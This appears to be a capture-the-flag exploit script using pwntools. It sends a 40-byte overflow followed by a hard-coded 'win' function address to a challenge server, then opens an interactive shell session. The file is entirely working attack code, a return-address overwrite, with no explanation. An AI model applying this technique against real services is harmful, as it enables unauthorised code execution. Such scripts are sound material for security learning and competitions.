#!/usr/bin/env python
from pwn import *

fil = remote('pwn.chall.pwnoh.io', 13379)

payload = b'a'*40
payload += p64(0x4011E0) # win address
payload += p64(0x401245) 

fil.send(payload)
fil.interactive()
